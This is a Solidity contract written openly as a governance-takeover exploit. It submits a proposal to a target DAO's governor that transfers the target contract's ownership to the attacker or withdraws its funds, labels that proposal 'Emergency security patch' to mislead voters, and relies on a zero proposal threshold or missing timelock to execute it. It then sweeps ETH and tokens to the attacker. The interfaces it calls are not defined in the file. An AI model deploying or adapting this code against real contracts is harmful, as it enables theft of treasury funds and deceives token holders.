// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnHunterGovTakeover {
    address public owner;
    address public governor;
    address public target;  // The contract to attack via governance

    constructor(address _governor, address _target) {
        owner = msg.sender;
        governor = _governor;
        target = _target;
    }

    // Step 1: Create malicious proposal (zero threshold = free)
    function createProposal() external returns (uint256) {
        require(msg.sender == owner);
        address[] memory targets = new address[](1);
        targets[0] = target;
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory calldatas = new bytes[](1);
        // Malicious action: transfer ownership or withdraw funds
        calldatas[0] = abi.encodeWithSignature("transferOwnership(address)", owner);
        // Or: calldatas[0] = abi.encodeWithSignature("withdraw()",);

        uint256 proposalId = IGovernor(governor).propose(
            targets, values, calldatas,
            "Emergency security patch"  // Disguised description
        );
        emit ProposalCreated(proposalId);
        return proposalId;
    }

    // Step 2: Execute proposal (if no timelock or if timelock is zero)
    function executeProposal(uint256 proposalId, address[] calldata targets, uint256[] calldata values, bytes[] calldata calldatas) external {
        require(msg.sender == owner);
        bytes32 descHash = keccak256(bytes("Emergency security patch"));
        IGovernor(governor).execute(targets, values, calldatas, descHash);
        emit ProposalExecuted(proposalId);
    }

    // Alternative: Direct execution if no timelock
    function directExecute(bytes calldata data) external {
        require(msg.sender == owner);
        (bool s,) = target.call(data);
        emit DirectExecuted(s);
    }

    function sweepETH() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    function sweepToken(address tokenAddr) external {
        require(msg.sender == owner);
        IERC20(tokenAddr).transfer(owner, IERC20(tokenAddr).balanceOf(address(this)));
    }

    event ProposalCreated(uint256 proposalId);
    event ProposalExecuted(uint256 proposalId);
    event DirectExecuted(bool success);
}
